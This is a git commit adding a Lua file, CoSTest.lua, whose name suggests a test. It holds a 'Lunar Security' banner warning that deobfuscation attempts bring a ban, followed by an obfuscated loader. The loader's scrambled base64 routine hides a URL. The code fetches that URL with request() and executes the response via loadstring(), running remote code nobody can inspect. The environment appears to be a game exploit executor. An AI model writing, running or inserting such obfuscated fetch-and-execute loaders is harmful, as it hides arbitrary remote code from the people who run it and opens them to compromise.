3cc0e3b54ed395cdf5591fd363c6aca5ce9c6638
Mangnex <127064046+Mangnex@users.noreply.github.com>
2024-11-30 18:21:03 -0500

    Create CoSTest.lua

---
+++ CoSTest.lua
@@ -0,0 +1,20 @@
+([[
+                     This script is protected by Lunar Security
+                Any hooking or deobfuscation attempt will result in a global ban
+                               https://discord.gg/XTKK959vsd
+
+    /$$                                                      /$$$$$$                                          /$$   /$$              
+    | $$                                                     /$$__  $$                                        |__/  | $$              
+    | $$       /$$   /$$ /$$$$$$$   /$$$$$$   /$$$$$$       | $$  \__/  /$$$$$$   /$$$$$$$ /$$   /$$  /$$$$$$  /$$ /$$$$$$   /$$   /$$
+    | $$      | $$  | $$| $$__  $$ |____  $$ /$$__  $$      |  $$$$$$  /$$__  $$ /$$_____/| $$  | $$ /$$__  $$| $$|_  $$_/  | $$  | $$
+    | $$      | $$  | $$| $$  \ $$  /$$$$$$$| $$  \__/       \____  $$| $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$    | $$  | $$
+    | $$      | $$  | $$| $$  | $$ /$$__  $$| $$             /$$  \ $$| $$_____/| $$      | $$  | $$| $$      | $$  | $$ /$$| $$  | $$
+    | $$$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$$| $$            |  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$      | $$  |  $$$$/|  $$$$$$$
+    |________/ \______/ |__/  |__/ \_______/|__/             \______/  \_______/ \_______/ \______/ |__/      |__/   \___/   \____  $$
+                                                                                                                            /$$  | $$
+                                                                                                                            |  $$$$$$/
+                                                                                                                            \______/                                                                     
+                 Script ID: 7hqzb0ai9c28129617c291549318ujx
+]])
+
+{([[This file was protected with Lunarfuscator v1.1]]):gsub('.+', (function(a) _QcPlYpdhBnGY7 = a; end)); (function(b)local c=debug.getmetatable(b)debug.setmetatable(b,{__call=function(d,e)debug.setmetatable(b,c)return function(b)b{'a',d}end end})end)''}local a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'function KntEtswTUbrCMsnUkCFzDnCddBHXTSiPcVVODMYbdTyCmtovnGxp(b)m=string.sub(b,0,55)b=b:gsub(m,'')b=string.gsub(b,'[^'..a..'=]','')return b:gsub('.',function(c)if c=='='then return''end;local d,e='',a:find(c)-1;for f=6,1,-1 do d=d..(e%2^f-e%2^(f-1)>0 and'1'or'0')end;return d end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(c)if#c~=8 then return''end;local g=0;for f=1,8 do g=g+(c:sub(f,f)=='1'and 2^(8-f)or 0)end;return string.char(g)end)end;return loadstring(request({Url=KntEtswTUbrCMsnUkCFzDnCddBHXTSiPcVVODMYbdTyCmtovnGxp('fmvmtiofcDIzSKCCtfmAMGJxDUZgieilQwUKYxfHvmKHFgDrKETxzHyaHR0cHM6Ly9sdW5hci1yZXN0LWFwaS52ZXJjZWwuYXBwL3NjcmlwdC94ZA=='),Method=KntEtswTUbrCMsnUkCFzDnCddBHXTSiPcVVODMYbdTyCmtovnGxp('pwBkkCuDCLMuvLNLvAYFyLCdermYOuGsZVWgvWnCopUmxPPvIWztpKNR0VU')}).Body)()
